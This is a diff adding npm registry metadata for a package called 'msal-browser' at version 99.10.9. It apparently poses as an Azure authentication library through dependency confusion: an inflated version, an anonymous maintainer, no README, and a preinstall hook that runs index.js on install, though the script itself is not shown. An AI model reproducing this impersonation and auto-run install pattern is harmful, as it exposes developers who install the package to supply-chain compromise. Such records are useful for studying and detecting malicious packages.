@@ -1,0 +1,62 @@
+{
+    "_id": "msal-browser",
+    "name": "msal-browser",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "msal-browser",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "msal-browser@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-QCfZGyp7mB+0alYMGJRY+gvSTCOquwaGeH45gZgQOeV6l7PxJwRCID0IVQ5W6stsNG09YppDaNOSza2IYypHyg==",
+                "shasum": "5b1fb623c8a5a137bf4eaadfe14a579a554138db",
+                "tarball": "https://registry.npmjs.org/msal-browser/-/msal-browser-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5064,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO1DcACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpP4g//Y+vGfdh8psZ1tutDjrhS46FWsfpogpiIeemU1rbZxpzh8f2r\r\n/Ilqc8MrJGv+MczqOcGIRjgQIyeZn85DPb4iBnlihKdWZf6rPu7r7Tv7H1n7\r\nLGBKFiWS6O6RJb+mH/pOskenQek1W8cHt0jSTwczxfWkZdtTtwuAuKowW8rM\r\n1L+WrI0fiEtqNsoYeQ9uMlcCZ5s7Dpp8FTeGYXWD1XsseOQeVYpAe4u6YLm1\r\nB5M7EbZnfm6YlrvKtXwfrB7MRnENtHzneuGYNBm0UUvlUwP1JQnl9u6b8tHH\r\n6VqkFlQtn1Y4gBEKkCevfKoXNBDYajsZTDxQiYsD6ic7BS74AG30XBjvMJ24\r\nR79snXnS9pXR7rvd8NHYHa7R5otWKPxRy1lr2kvDdwf8Wbc4MSYKrLGH3uED\r\nNcBTBw7f25ooDhe9ZJQUXFhFK/pMEDFKyrBNWoqPwZWjsZHCUsRn06K/D5vx\r\nUrhrlnU5l132o6uWHK30RixbDL6vWY1uhRyCVbfvXdJ31esI+vjTzVawDO26\r\nkoLMn9OWD3ok86MrcPvm1BASbGN8117EXPAvoEIl8fKqVqRr454IyIleo652\r\nhQCBgQPcJ8Mys0HFsSdpVXITqzOb96UlFWoOzZsP3JfW+0xhkiYka2V545aQ\r\nlQjKwFExIZ4WXF4mHIiYLf3W+ZmftGBgEOc=\r\n=ZGMO\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "3lpqsqiq",
+                "email": "3lpqsqiq@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "3lpqsqiq",
+                    "email": "3lpqsqiq@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/msal-browser_99.10.9_1648054492569_0.3395639091472291"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T16:54:52.568Z",
+        "99.10.9": "2022-03-23T16:54:52.718Z",
+        "modified": "2022-03-23T16:54:52.855Z"
+    },
+    "maintainers": [
+        {
+            "name": "3lpqsqiq",
+            "email": "3lpqsqiq@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
